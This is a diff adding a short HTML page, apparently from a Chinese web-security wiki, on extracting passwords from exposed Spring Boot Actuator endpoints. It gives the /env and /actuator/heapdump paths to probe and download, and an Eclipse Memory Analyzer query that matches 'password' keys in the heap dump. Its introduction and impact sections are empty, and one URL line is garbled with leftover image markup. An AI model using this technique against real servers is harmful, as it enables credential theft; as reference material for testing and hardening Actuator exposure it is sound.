@@ -1,0 +1,32 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="spring-boot-提取内存密码"><span class="csDE05BCC">Spring Boot </span><span class="csECDA2D3">提取内存密码</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs9C1B1871">访问如下路径如果有数据说明存在漏洞</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">Spring Boot 1.x</span><span class="csE3F655E4">版本</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">http://www.0-sec.org:8090/env</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">Spring Boot 2.x</span><span class="csE3F655E4">版本</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">https://wiki.0-sec.org/img src=&quot;https://wiki.0-sec.org/img/bb0b08f5678e408ab0361807aa8ebfcf.png&quot; alt=&quot;2.png&quot; class=&quot;large&quot; onclick=&quot;window.open(this.src)&quot; /&gt;</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">当发现存在未授权漏洞时，可以直接访问</span><span class="cs8926E06"> </span><span class="cs9FB05234">/actuator/heapdump</span><span class="cs8926E06"> </span><span class="cs9C1B1871">下载内存，提取密码</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">http://www.0-sec.org:8090/actuator/heapdump</span></p><p class="cs6FD73CFB"><span class="cs8926E06">heapdump</span><span class="cs9C1B1871">文件下载完成之后可以利用</span><span class="cs8926E06">Eclipse Memory Analyzer </span><span class="cs9C1B1871">来解析内存文件</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.eclipse.org/mat/downloads.php</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">匹配内存中</span><span class="cs8926E06">password</span><span class="cs9C1B1871">字符串，并不一定能匹配完，可以通过</span><span class="cs9FB05234">/actuator/env</span><span class="cs9C1B1871">得到的</span><span class="cs9FB05234">JDBC</span><span class="cs9C1B1871">信息再来匹配关键字</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Spring_Boot/Spring%20Boot%20%e6%8f%90%e5%8f%96%e5%86%85%e5%ad%98%e5%af%86%e7%a0%81_files/image0.png" width="560" height="332" alt="" style="border-width:0px;" /></span></p></body>
+</html>
